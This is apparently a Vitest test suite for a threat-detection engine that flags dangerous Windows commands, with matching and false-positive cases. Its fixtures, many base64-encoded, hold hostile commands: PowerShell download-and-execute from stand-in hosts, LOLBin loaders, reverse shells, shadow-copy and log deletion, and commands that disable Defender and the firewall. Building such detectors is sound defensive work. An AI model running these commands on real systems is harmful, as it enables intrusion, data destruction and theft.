import { beforeAll, describe, expect, it } from "vitest";
import { DecisionEngine } from "../engine.js";
import type { HeuristicsEngine } from "../heuristics.js";
import { createMatcher, loadEngine } from "./test-helper.js";

const decodeCommand = (value: string): string => Buffer.from(value, "base64").toString("utf8");

const matchCommand = createMatcher("command");

describe("Windows command threats", () => {
	let engine: HeuristicsEngine;

	beforeAll(async () => {
		engine = await loadEngine();
	});

	// --- PowerShell Download-Execute (WIN-CMD-001) ---

	it("detects irm | iex", () => {
		expect(matchCommand(engine, decodeCommand("aXJtIGh0dHBzOi8vZXZpbC5jb20vaW5zdGFsbC5wczEgfCBpZXg="))).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects iwr | iex", () => {
		expect(matchCommand(engine, decodeCommand("aXdyIGh0dHBzOi8vZXZpbC5jb20vcGF5bG9hZC5wczEgfCBpZXg="))).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects Invoke-WebRequest | Invoke-Expression", () => {
		expect(
			matchCommand(engine, decodeCommand("SW52b2tlLVdlYlJlcXVlc3QgaHR0cHM6Ly9ldmlsLmNvbS9zLnBzMSB8IEludm9rZS1FeHByZXNzaW9u")),
		).toContain("CLT-WIN-CMD-001");
	});

	it("detects Invoke-RestMethod | Invoke-Expression", () => {
		expect(
			matchCommand(engine, decodeCommand("SW52b2tlLVJlc3RNZXRob2QgaHR0cHM6Ly9ldmlsLmNvbS9zLnBzMSB8IEludm9rZS1FeHByZXNzaW9u")),
		).toContain("CLT-WIN-CMD-001");
	});

	it("detects curl | iex (PS alias)", () => {
		expect(matchCommand(engine, decodeCommand("Y3VybCBodHRwczovL2V2aWwuY29tL2luc3RhbGwucHMxIHwgaWV4"))).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	it("detects wget | iex (PS alias)", () => {
		expect(matchCommand(engine, decodeCommand("d2dldCBodHRwczovL2V2aWwuY29tL2luc3RhbGwucHMxIHwgaWV4"))).toContain(
			"CLT-WIN-CMD-001",
		);
	});

	// --- IEX wrapping download (WIN-CMD-002) ---

	it("detects iex(irm url)", () => {
		expect(matchCommand(engine, decodeCommand("aWV4KGlybSBodHRwczovL2V2aWwuY29tL3MucHMxKQ=="))).toContain("CLT-WIN-CMD-002");
	});

	it("detects IEX((New-Object Net.WebClient).DownloadString(url))", () => {
		expect(
			matchCommand(
				engine,
				"IEX((New-Object Net.WebClient).DownloadString('https://evil.com/s.ps1'))",
			),
		).toContain("CLT-WIN-CMD-002");
	});

	it("detects iex(iwr url)", () => {
		expect(matchCommand(engine, decodeCommand("aWV4KGl3ciBodHRwczovL2V2aWwuY29tL3MucHMxKQ=="))).toContain("CLT-WIN-CMD-002");
	});

	// --- Start-Process (WIN-CMD-003) ---

	it("detects Start-Process with exe", () => {
		expect(matchCommand(engine, decodeCommand("U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggbWFsd2FyZS5leGU="))).toContain(
			"CLT-WIN-CMD-003",
		);
	});

	it("detects Start-Process with ps1", () => {
		expect(matchCommand(engine, decodeCommand("U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggcGF5bG9hZC5wczE="))).toContain(
			"CLT-WIN-CMD-003",
		);
	});

	// --- Download then execute chain (WIN-CMD-004) ---

	it("detects curl -o file.cmd && execute", () => {
		expect(
			matchCommand(
				engine,
				"curl -fsSL https://evil.com/install.cmd -o install.cmd && install.cmd && del install.cmd",
			),
		).toContain("CLT-WIN-CMD-004");
	});

	it("detects iwr -OutFile then semicolon execute", () => {
		expect(matchCommand(engine, decodeCommand("aXdyIGh0dHBzOi8vZXZpbC5jb20vcy5wczEgLU91dEZpbGUgcy5wczE7IC5ccy5wczE="))).toContain(
			"CLT-WIN-CMD-004",
		);
	});

	// --- .NET WebClient (WIN-CMD-005) ---

	it("detects New-Object Net.WebClient DownloadString", () => {
		expect(
			matchCommand(engine, decodeCommand("KE5ldy1PYmplY3QgTmV0LldlYkNsaWVudCkuRG93bmxvYWRTdHJpbmcoJ2h0dHBzOi8vZXZpbC5jb20vcy5wczEnKQ==")),
		).toContain("CLT-WIN-CMD-005");
	});

	it("detects New-Object Net.WebClient DownloadFile", () => {
		expect(
			matchCommand(
				engine,
				"(New-Object Net.WebClient).DownloadFile('https://evil.com/m.exe','m.exe')",
			),
		).toContain("CLT-WIN-CMD-005");
	});

	// --- Start-BitsTransfer (WIN-CMD-006) ---

	it("detects Start-BitsTransfer", () => {
		expect(
			matchCommand(
				engine,
				"Start-BitsTransfer -Source https://evil.com/payload.exe -Destination C:\\temp\\payload.exe",
			),
		).toContain("CLT-WIN-CMD-006");
	});

	// --- LOLBins ---

	it("detects certutil -urlcache (WIN-CMD-007)", () => {
		expect(
			matchCommand(engine, decodeCommand("Y2VydHV0aWwgLXVybGNhY2hlIC1mIGh0dHBzOi8vZXZpbC5jb20vcGF5bG9hZC5leGUgcGF5bG9hZC5leGU=")),
		).toContain("CLT-WIN-CMD-007");
	});

	it("detects certutil -decode (WIN-CMD-007)", () => {
		expect(matchCommand(engine, decodeCommand("Y2VydHV0aWwgLWRlY29kZSBlbmNvZGVkLmI2NCBwYXlsb2FkLmV4ZQ=="))).toContain(
			"CLT-WIN-CMD-007",
		);
	});

	it("detects bitsadmin /transfer (WIN-CMD-008)", () => {
		expect(
			matchCommand(
				engine,
				"bitsadmin /transfer myJob https://evil.com/payload.exe C:\\temp\\payload.exe",
			),
		).toContain("CLT-WIN-CMD-008");
	});

	it("detects mshta remote HTA (WIN-CMD-009)", () => {
		expect(matchCommand(engine, decodeCommand("bXNodGEgaHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLmh0YQ=="))).toContain("CLT-WIN-CMD-009");
	});

	it("detects regsvr32 scriptlet (WIN-CMD-010)", () => {
		expect(
			matchCommand(engine, decodeCommand("cmVnc3ZyMzIgL3MgL2k6aHR0cHM6Ly9ldmlsLmNvbS9wYXlsb2FkLnNjdCBzY3JvYmouZGxs")),
		).toContain("CLT-WIN-CMD-010");
	});

	it("detects rundll32 javascript (WIN-CMD-011)", () => {
		expect(
			matchCommand(engine, decodeCommand("cnVuZGxsMzIgamF2YXNjcmlwdDoiXC4uXG1zaHRtbCxSdW5IVE1MQXBwbGljYXRpb24iO2FsZXJ0KDEp")),
		).toContain("CLT-WIN-CMD-011");
	});

	it("detects cmstp INF (WIN-CMD-012)", () => {
		expect(matchCommand(engine, decodeCommand("Y21zdHAgL2F1IC9zIGV2aWwuaW5m"))).toContain("CLT-WIN-CMD-012");
	});

	it("detects wmic process call create (WIN-CMD-013)", () => {
		expect(matchCommand(engine, decodeCommand("d21pYyBwcm9jZXNzIGNhbGwgY3JlYXRlICJjbWQgL2MgbWFsd2FyZS5leGUi"))).toContain(
			"CLT-WIN-CMD-013",
		);
	});

	it("detects msiexec remote (WIN-CMD-014)", () => {
		expect(matchCommand(engine, decodeCommand("bXNpZXhlYyAvcSAvaSBodHRwczovL2V2aWwuY29tL3BrZy5tc2k="))).toContain(
			"CLT-WIN-CMD-014",
		);
	});

	it("detects forfiles /c cmd (WIN-CMD-015)", () => {
		expect(matchCommand(engine, decodeCommand("Zm9yZmlsZXMgL2MgImNtZCAvYyBwYXlsb2FkLmV4ZSI="))).toContain("CLT-WIN-CMD-015");
	});

	it("detects pcalua -a (WIN-CMD-016)", () => {
		expect(matchCommand(engine, decodeCommand("cGNhbHVhIC1hIG1hbHdhcmUuZXhl"))).toContain("CLT-WIN-CMD-016");
	});

	it("detects installutil (WIN-CMD-017)", () => {
		expect(matchCommand(engine, decodeCommand("aW5zdGFsbHV0aWwgL2xvZ2ZpbGU9IC9sb2d0b2NvbnNvbGU9ZmFsc2UgcGF5bG9hZC5kbGw="))).toContain(
			"CLT-WIN-CMD-017",
		);
	});

	it("detects regasm /u (WIN-CMD-018)", () => {
		expect(matchCommand(engine, decodeCommand("cmVnYXNtIC91IHBheWxvYWQuZGxs"))).toContain("CLT-WIN-CMD-018");
	});

	it("detects regsvcs (WIN-CMD-018)", () => {
		expect(matchCommand(engine, decodeCommand("cmVnc3ZjcyBwYXlsb2FkLmRsbA=="))).toContain("CLT-WIN-CMD-018");
	});

	// --- Destructive operations ---

	it("detects format C: (WIN-CMD-019)", () => {
		expect(matchCommand(engine, decodeCommand("Zm9ybWF0IEM6"))).toContain("CLT-WIN-CMD-019");
	});

	it("detects rd /s /q C:\\ (WIN-CMD-020)", () => {
		expect(matchCommand(engine, decodeCommand("cmQgL3MgL3EgQzpc"))).toContain("CLT-WIN-CMD-020");
	});

	it("detects del /f /s /q C:\\ (WIN-CMD-021)", () => {
		expect(matchCommand(engine, decodeCommand("ZGVsIC9mIC9zIC9xIEM6XA=="))).toContain("CLT-WIN-CMD-021");
	});

	it("detects diskpart (WIN-CMD-022)", () => {
		expect(matchCommand(engine, decodeCommand("ZGlza3BhcnQ="))).toContain("CLT-WIN-CMD-022");
	});

	// --- Reverse shells ---

	it("detects PS TCP reverse shell (WIN-CMD-023)", () => {
		expect(
			matchCommand(engine, decodeCommand("TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVGNwQ2xpZW50KCcxMC4wLjAuMScsNDQ0NCk=")),
		).toContain("CLT-WIN-CMD-023");
	});

	it("detects PS UDP reverse shell (WIN-CMD-024)", () => {
		expect(
			matchCommand(engine, decodeCommand("TmV3LU9iamVjdCBTeXN0ZW0uTmV0LlNvY2tldHMuVWRwQ2xpZW50KCcxMC4wLjAuMScsNDQ0NCk=")),
		).toContain("CLT-WIN-CMD-024");
	});

	// --- Privilege escalation ---

	it("detects runas /user: (WIN-CMD-025)", () => {
		expect(matchCommand(engine, decodeCommand("cnVuYXMgL3VzZXI6QWRtaW5pc3RyYXRvciBjbWQuZXhl"))).toContain("CLT-WIN-CMD-025");
	});

	it("detects Set-ExecutionPolicy Bypass (WIN-CMD-026)", () => {
		expect(matchCommand(engine, decodeCommand("U2V0LUV4ZWN1dGlvblBvbGljeSBCeXBhc3M="))).toContain("CLT-WIN-CMD-026");
	});

	it("detects Set-ExecutionPolicy Unrestricted (WIN-CMD-026)", () => {
		expect(matchCommand(engine, decodeCommand("U2V0LUV4ZWN1dGlvblBvbGljeSBVbnJlc3RyaWN0ZWQ="))).toContain("CLT-WIN-CMD-026");
	});

	it("detects fodhelper (WIN-CMD-027)", () => {
		expect(matchCommand(engine, decodeCommand("Zm9kaGVscGVy"))).toContain("CLT-WIN-CMD-027");
	});

	// --- PowerShell Destructive Operations (028-029) ---

	it("detects Remove-Item -Recurse -Force (WIN-CMD-028)", () => {
		expect(matchCommand(engine, decodeCommand("UmVtb3ZlLUl0ZW0gQzpcVXNlcnNcUHVibGljIC1SZWN1cnNlIC1Gb3JjZQ=="))).toContain(
			"CLT-WIN-CMD-028",
		);
	});

	it("detects Remove-Item -Force -Recurse (reversed flags) (WIN-CMD-028)", () => {
		expect(matchCommand(engine, decodeCommand("UmVtb3ZlLUl0ZW0gQzpcdGVtcCAtRm9yY2UgLVJlY3Vyc2U="))).toContain(
			"CLT-WIN-CMD-028",
		);
	});

	it("detects Clear-RecycleBin -Force (WIN-CMD-029)", () => {
		expect(matchCommand(engine, decodeCommand("Q2xlYXItUmVjeWNsZUJpbiAtRm9yY2U="))).toContain("CLT-WIN-CMD-029");
	});

	// --- Additional Reverse Shells (030) ---

	it("detects ncat -e cmd (WIN-CMD-030)", () => {
		expect(matchCommand(engine, decodeCommand("bmNhdCAxMC4wLjAuMSA0NDQ0IC1lIGNtZA=="))).toContain("CLT-WIN-CMD-030");
	});

	it("detects ncat -e powershell.exe (WIN-CMD-030)", () => {
		expect(matchCommand(engine, decodeCommand("bmNhdCAxMC4wLjAuMSA0NDQ0IC1lIHBvd2Vyc2hlbGwuZXhl"))).toContain(
			"CLT-WIN-CMD-030",
		);
	});

	// --- Shadow Copy / Recovery Destruction (031-034) ---

	it("detects vssadmin delete shadows (WIN-CMD-031)", () => {
		expect(matchCommand(engine, decodeCommand("dnNzYWRtaW4gZGVsZXRlIHNoYWRvd3MgL2FsbCAvcXVpZXQ="))).toContain(
			"CLT-WIN-CMD-031",
		);
	});

	it("detects vssadmin Delete Shadows mixed case (WIN-CMD-031)", () => {
		expect(matchCommand(engine, decodeCommand("dnNzYWRtaW4gRGVsZXRlIFNoYWRvd3MgL0FsbA=="))).toContain("CLT-WIN-CMD-031");
	});

	it("detects wmic shadowcopy delete (WIN-CMD-032)", () => {
		expect(matchCommand(engine, decodeCommand("d21pYyBzaGFkb3djb3B5IGRlbGV0ZQ=="))).toContain("CLT-WIN-CMD-032");
	});

	it("detects bcdedit recovery disable (WIN-CMD-033)", () => {
		expect(matchCommand(engine, decodeCommand("YmNkZWRpdCAvc2V0IHtkZWZhdWx0fSByZWNvdmVyeWVuYWJsZWQgTm8="))).toContain(
			"CLT-WIN-CMD-033",
		);
	});

	it("detects PowerShell WMI shadow copy deletion (WIN-CMD-034)", () => {
		expect(
			matchCommand(engine, decodeCommand("R2V0LVdtaU9iamVjdCBXaW4zMl9TaGFkb3dDb3B5IHwgRm9yRWFjaC1PYmplY3QgeyAkXy5EZWxldGUoKSB9")),
		).toContain("CLT-WIN-CMD-034");
	});

	it("detects PowerShell CIM shadow copy deletion (WIN-CMD-034)", () => {
		expect(matchCommand(engine, decodeCommand("R2V0LUNpbUluc3RhbmNlIFdpbjMyX1NoYWRvd0NvcHkgfCBSZW1vdmUtQ2ltSW5zdGFuY2U="))).toContain(
			"CLT-WIN-CMD-034",
		);
	});

	// --- Defense Evasion / Anti-Forensics (035-039) ---

	it("detects wevtutil cl Security (WIN-CMD-035)", () => {
		expect(matchCommand(engine, decodeCommand("d2V2dHV0aWwgY2wgU2VjdXJpdHk="))).toContain("CLT-WIN-CMD-035");
	});

	it("detects wevtutil clear-log (WIN-CMD-035)", () => {
		expect(matchCommand(engine, decodeCommand("d2V2dHV0aWwgY2xlYXItbG9nIEFwcGxpY2F0aW9u"))).toContain("CLT-WIN-CMD-035");
	});

	it("detects Clear-EventLog (WIN-CMD-036)", () => {
		expect(matchCommand(engine, decodeCommand("Q2xlYXItRXZlbnRMb2cgLUxvZ05hbWUgU2VjdXJpdHk="))).toContain("CLT-WIN-CMD-036");
	});

	it("detects Remove-EventLog (WIN-CMD-036)", () => {
		expect(matchCommand(engine, decodeCommand("UmVtb3ZlLUV2ZW50TG9nIC1Mb2dOYW1lIE15TG9n"))).toContain("CLT-WIN-CMD-036");
	});

	it("detects Set-MpPreference -DisableRealtimeMonitoring (WIN-CMD-037)", () => {
		expect(matchCommand(engine, decodeCommand("U2V0LU1wUHJlZmVyZW5jZSAtRGlzYWJsZVJlYWx0aW1lTW9uaXRvcmluZyAkdHJ1ZQ=="))).toContain(
			"CLT-WIN-CMD-037",
		);
	});

	it("denies case-insensitive Set-MpPreference spellings (WIN-CMD-037)", async () => {
		const matches = engine.match([
			{ type: "command", value: "set-mppreference -disablerealtimemonitoring $true" },
		]);
		expect(matches.map((match) => match.threat.id)).toContain("CLT-WIN-CMD-037");
		await expect(
			new DecisionEngine().decide({ heuristicMatches: matches, urlCheckResults: [] }),
		).resolves.toMatchObject({ decision: "deny", matchedThreatId: "CLT-WIN-CMD-037" });
	});

	it("detects sc stop WinDefend (WIN-CMD-038)", () => {
		expect(matchCommand(engine, decodeCommand("c2Mgc3RvcCBXaW5EZWZlbmQ="))).toContain("CLT-WIN-CMD-038");
	});

	it("detects net stop MpsSvc (WIN-CMD-038)", () => {
		expect(matchCommand(engine, decodeCommand("bmV0IHN0b3AgTXBzU3Zj"))).toContain("CLT-WIN-CMD-038");
	});

	it("detects Stop-Service SecurityHealthService (WIN-CMD-038)", () => {
		expect(matchCommand(engine, decodeCommand("U3RvcC1TZXJ2aWNlIFNlY3VyaXR5SGVhbHRoU2VydmljZQ=="))).toContain("CLT-WIN-CMD-038");
	});

	it("detects netsh advfirewall state off (WIN-CMD-039)", () => {
		expect(matchCommand(engine, decodeCommand("bmV0c2ggYWR2ZmlyZXdhbGwgc2V0IGFsbHByb2ZpbGVzIHN0YXRlIG9mZg=="))).toContain(
			"CLT-WIN-CMD-039",
		);
	});

	it("denies uppercase netsh firewall disable (WIN-CMD-039)", async () => {
		const matches = engine.match([
			{ type: "command", value: "NETSH ADVFIREWALL SET ALLPROFILES STATE OFF" },
		]);
		expect(matches.map((match) => match.threat.id)).toContain("CLT-WIN-CMD-039");
		await expect(
			new DecisionEngine().decide({ heuristicMatches: matches, urlCheckResults: [] }),
		).resolves.toMatchObject({ decision: "deny", matchedThreatId: "CLT-WIN-CMD-039" });
	});

	// --- Data Exfiltration Indicators (040-041) ---

	it("detects rar -p (password archive) (WIN-CMD-040)", () => {
		expect(matchCommand(engine, decodeCommand("cmFyIGEgLXBTRUNSRVQgYXJjaGl2ZS5yYXIgQzpcVXNlcnNcZG9jc1wq"))).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects 7z -p (password archive) (WIN-CMD-040)", () => {
		expect(matchCommand(engine, decodeCommand("N3ogYSAtcE15UGFzc3dvcmQgZXhmaWwuN3ogQzpcc2VjcmV0cw=="))).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects zip --password (WIN-CMD-040)", () => {
		expect(matchCommand(engine, decodeCommand("emlwIC0tcGFzc3dvcmQgU0VDUkVUIGFyY2hpdmUuemlwIGZpbGUudHh0"))).toContain(
			"CLT-WIN-CMD-040",
		);
	});

	it("detects bulk *.docx archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, decodeCommand("N3ogYSBkb2NzLjd6IEM6XFVzZXJzXCouZG9jeA=="))).toContain("CLT-WIN-CMD-041");
	});

	it("detects bulk *.xlsx archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, decodeCommand("cmFyIGEgc3ByZWFkc2hlZXRzLnJhciBEOlxTaGFyZVwqLnhsc3g="))).toContain(
			"CLT-WIN-CMD-041",
		);
	});

	it("detects bulk *.pdf archiving (WIN-CMD-041)", () => {
		expect(matchCommand(engine, decodeCommand("emlwIHJlcG9ydHMuemlwIEM6XFJlcG9ydHNcKi5wZGY="))).toContain("CLT-WIN-CMD-041");
	});

	it("detects password + document wildcard combo (WIN-CMD-040+041)", () => {
		const ids = matchCommand(engine, decodeCommand("N3ogYSAtcFNFQ1JFVCBleGZpbC43eiBDOlxVc2Vyc1wqLmRvY3g="));
		expect(ids).toContain("CLT-WIN-CMD-040");
		expect(ids).toContain("CLT-WIN-CMD-041");
	});

	// --- AutoIt3 Script Execution (042) ---

	it("detects AutoIt3ExecuteScript (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Google\\AutoIt3.exe" /AutoIt3ExecuteScript C:\\Google\\googleupdate.a3x',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects renamed AutoIt3 binary (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\GoogleChrome\\GoogleChrome.exe" /AutoIt3ExecuteScript C:\\GoogleChrome\\GoogleChrome.a3x',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects cmd start + AutoIt3 (WIN-CMD-042)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Windows\\System32\\cmd.exe" /c start C:\\streamer\\streamer.exe /AutoIt3ExecuteScript "C:\\streamer\\stream.txt" & exit',
			),
		).toContain("CLT-WIN-CMD-042");
	});

	it("detects case-insensitive AutoIt3 flag (WIN-CMD-042)", () => {
		expect(matchCommand(engine, decodeCommand("U2V0dXAuZXhlIC9hdXRvaXQzZXhlY3V0ZXNjcmlwdCBjLmEzeA=="))).toContain(
			"CLT-WIN-CMD-042",
		);
	});

	// --- Script execution from C:\Users\Public (043) ---

	it("detects wscript from Users\\Public (WIN-CMD-043)", () => {
		expect(matchCommand(engine, decodeCommand("d3NjcmlwdC5leGUgIkM6XFVzZXJzXFB1YmxpY1xDb250cm9sbGVyXHpha2VjLmpzIg=="))).toContain(
			"CLT-WIN-CMD-043",
		);
	});

	it("detects cscript from Users\\Public (WIN-CMD-043)", () => {
		expect(matchCommand(engine, decodeCommand("Y3NjcmlwdC5leGUgIkM6XFVzZXJzXFB1YmxpY1xNdXNpY1xUdk11c2ljLnZicyI="))).toContain(
			"CLT-WIN-CMD-043",
		);
	});

	it("detects WScript.exe from Users\\Public\\Documents (WIN-CMD-043)", () => {
		expect(
			matchCommand(
				engine,
				"C:\\Windows\\System32\\wscript.exe C:\\Users\\Public\\Documents\\uqeyi\\osuvi.js",
			),
		).toContain("CLT-WIN-CMD-043");
	});

	it("does not match wscript from normal path (WIN-CMD-043 neg)", () => {
		const ids = matchCommand(engine, decodeCommand("d3NjcmlwdC5leGUgIkM6XFByb2dyYW0gRmlsZXNcQXBwXHNjcmlwdC52YnMi"));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-043")).toEqual([]);
	});

	// --- regsvr32 Squiblydoo with remote URL (044) ---

	it("detects regsvr32 /i:shellcode,https:// (WIN-CMD-044)", () => {
		expect(
			matchCommand(
				engine,
				"regsvr32.exe /s /i:shellcode,https://gist.githubusercontent.com/evil/raw/ssl C:\\Users\\Public\\Music\\bin\\64.dll",
			),
		).toContain("CLT-WIN-CMD-044");
	});

	it("detects regsvr32 /i:http:// (WIN-CMD-044)", () => {
		expect(
			matchCommand(engine, decodeCommand("cmVnc3ZyMzIgL3MgL2k6aHR0cDovL2V2aWwudGVzdC9wYXlsb2FkLnNjdCBzY3JvYmouZGxs")),
		).toContain("CLT-WIN-CMD-044");
	});

	it("does not match regsvr32 /s normal DLL (WIN-CMD-044 neg)", () => {
		const ids = matchCommand(engine, decodeCommand("cmVnc3ZyMzIuZXhlIC9zICJDOlxQcm9ncmFtIEZpbGVzXEFwcFxjb250cm9sLmRsbCI="));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-044")).toEqual([]);
	});

	// --- cmdl32.exe LOLBin (045) ---

	it("detects cmdl32.exe (WIN-CMD-045)", () => {
		expect(
			matchCommand(
				engine,
				'"C:\\Windows\\System32\\cmdl32.exe" /VPN "C:\\ProgramData\\Microsoft\\Network\\Connections\\Cm\\vpn1.cmp"',
			),
		).toContain("CLT-WIN-CMD-045");
	});

	// --- Download then start via single & (046) ---

	it("detects curl --output + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"cmd /c curl http://evil.test/a.exe --output C:\\Users\\Public\\a.exe & start C:\\Users\\Public\\a.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("detects curl -o + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"curl http://evil.test/payload.exe -o C:\\temp\\p.exe & start C:\\temp\\p.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("detects wget --output + start chain (WIN-CMD-046)", () => {
		expect(
			matchCommand(
				engine,
				"wget http://evil.test/m.exe --output C:\\Users\\Public\\m.exe & start C:\\Users\\Public\\m.exe",
			),
		).toContain("CLT-WIN-CMD-046");
	});

	it("does not match curl without start (WIN-CMD-046 neg)", () => {
		const ids = matchCommand(engine, decodeCommand("Y3VybCBodHRwOi8vZXhhbXBsZS5jb20vZGF0YS5qc29uIC0tb3V0cHV0IGRhdGEuanNvbg=="));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-046")).toEqual([]);
	});

	// --- Negative cases ---

	it("does not match Get-Help", () => {
		const ids = matchCommand(engine, decodeCommand("R2V0LUhlbHAgSW52b2tlLVdlYlJlcXVlc3Q="));
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match simple dir command", () => {
		const ids = matchCommand(engine, decodeCommand("ZGlyIEM6XFVzZXJz"));
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match normal curl to file without execute", () => {
		const ids = matchCommand(engine, decodeCommand("Y3VybCAtbyBvdXRwdXQudHh0IGh0dHBzOi8vZXhhbXBsZS5jb20vZGF0YS5qc29u"));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-004")).toEqual([]);
	});

	it("does not match Get-Process", () => {
		const ids = matchCommand(engine, decodeCommand("R2V0LVByb2Nlc3MgfCBXaGVyZS1PYmplY3QgeyAkXy5DUFUgLWd0IDEwMCB9"));
		expect(ids.filter((id) => id.startsWith("CLT-WIN-CMD"))).toEqual([]);
	});

	it("does not match vssadmin list shadows", () => {
		const ids = matchCommand(engine, decodeCommand("dnNzYWRtaW4gbGlzdCBzaGFkb3dz"));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-031")).toEqual([]);
	});

	it("does not match wevtutil qe (query)", () => {
		const ids = matchCommand(engine, decodeCommand("d2V2dHV0aWwgcWUgU2VjdXJpdHkgL2M6MTA="));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-035")).toEqual([]);
	});

	it("does not match 7z without password (normal archive)", () => {
		const ids = matchCommand(engine, decodeCommand("N3ogYSBhcmNoaXZlLjd6IHNyYy8="));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-040")).toEqual([]);
	});

	it("does not match sc query WinDefend (status check)", () => {
		const ids = matchCommand(engine, decodeCommand("c2MgcXVlcnkgV2luRGVmZW5k"));
		expect(ids.filter((id) => id === "CLT-WIN-CMD-038")).toEqual([]);
	});

	// --- Additional FP coverage ---

	it("does not match Start-Process without executable extension (003 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("U3RhcnQtUHJvY2VzcyAtRmlsZVBhdGggIm5vdGVwYWQi"));
		expect(ids).not.toContain("CLT-WIN-CMD-003");
	});

	it("does not match Get-BitsTransfer (006 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("R2V0LUJpdHNUcmFuc2Zlcg=="));
		expect(ids).not.toContain("CLT-WIN-CMD-006");
	});

	it("does not match Format-Table (019 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("Rm9ybWF0LVRhYmxlIC1Qcm9wZXJ0eSBOYW1lLFZhbHVl"));
		expect(ids).not.toContain("CLT-WIN-CMD-019");
	});

	it("does not match Set-ExecutionPolicy RemoteSigned (026 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("U2V0LUV4ZWN1dGlvblBvbGljeSBSZW1vdGVTaWduZWQ="));
		expect(ids).not.toContain("CLT-WIN-CMD-026");
	});

	it("does not match Get-ExecutionPolicy (026 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("R2V0LUV4ZWN1dGlvblBvbGljeQ=="));
		expect(ids).not.toContain("CLT-WIN-CMD-026");
	});

	it("does not match Remove-Item without -Recurse -Force (028 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("UmVtb3ZlLUl0ZW0gLVBhdGggLlx0ZW1wLnR4dA=="));
		expect(ids).not.toContain("CLT-WIN-CMD-028");
	});

	it("does not match Clear-RecycleBin without -Force (029 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("Q2xlYXItUmVjeWNsZUJpbg=="));
		expect(ids).not.toContain("CLT-WIN-CMD-029");
	});

	it("does not match bcdedit /enum (033 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("YmNkZWRpdCAvZW51bQ=="));
		expect(ids).not.toContain("CLT-WIN-CMD-033");
	});

	it("does not match Get-MpPreference (037 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("R2V0LU1wUHJlZmVyZW5jZQ=="));
		expect(ids).not.toContain("CLT-WIN-CMD-037");
	});

	it("does not match 7z archiving non-document wildcards (041 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("N3ogYSBiYWNrdXAuN3ogc3JjLyouanNvbg=="));
		expect(ids).not.toContain("CLT-WIN-CMD-041");
	});

	it("does not match zip without password for normal files (040 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("emlwIGFyY2hpdmUuemlwIHNyYy8qLnRz"));
		expect(ids).not.toContain("CLT-WIN-CMD-040");
	});

	it("does not match netsh advfirewall show (039 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("bmV0c2ggYWR2ZmlyZXdhbGwgc2hvdyBhbGxwcm9maWxlcyBzdGF0ZQ=="));
		expect(ids).not.toContain("CLT-WIN-CMD-039");
	});

	it("does not match Get-EventLog (036 FP)", () => {
		const ids = matchCommand(engine, decodeCommand("R2V0LUV2ZW50TG9nIC1Mb2dOYW1lIEFwcGxpY2F0aW9uIC1OZXdlc3QgMTA="));
		expect(ids).not.toContain("CLT-WIN-CMD-036");
	});

	// --- Shadow copy/VSS/backup destruction (WIN-CMD-047) ---

	it("detects vssadmin resize shadowstorage (WIN-CMD-047)", () => {
		expect(
			matchCommand(engine, decodeCommand("dnNzYWRtaW4gcmVzaXplIHNoYWRvd3N0b3JhZ2UgL2Zvcj1DOiAvb249QzogL21heHNpemU9NDAxTUI=")),
		).toContain("CLT-WIN-CMD-047");
	});

	it("detects wbadmin delete catalog (WIN-CMD-047)", () => {
		expect(matchCommand(engine, decodeCommand("d2JhZG1pbiBkZWxldGUgY2F0YWxvZyAtcXVpZXQ="))).toContain("CLT-WIN-CMD-047");
	});

	it("detects VSS service disable via reg (WIN-CMD-047)", () => {
		expect(
			matchCommand(
				engine,
				"reg add HKLM\\SYSTEM\\CurrentControlSet\\services\\VSS /v Start /t REG_DWORD /d 4 /f",
			),
		).toContain("CLT-WIN-CMD-047");
	});

	// --- Firewall manipulation (WIN-CMD-048/049) ---

	it("detects legacy netsh firewall opmode DISABLE (WIN-CMD-048)", () => {
		expect(matchCommand(engine, decodeCommand("bmV0c2ggZmlyZXdhbGwgc2V0IG9wbW9kZSBtb2RlPURJU0FCTEU="))).toContain(
			"CLT-WIN-CMD-048",
		);
	});

	it("detects netsh advfirewall add rule (WIN-CMD-049)", () => {
		expect(
			matchCommand(
				engine,
				"netsh advfirewall firewall add rule name=backdoor program=C:\\evil.exe action=allow",
			),
		).toContain("CLT-WIN-CMD-049");
	});

	// --- LOLBins (WIN-CMD-050..055) ---

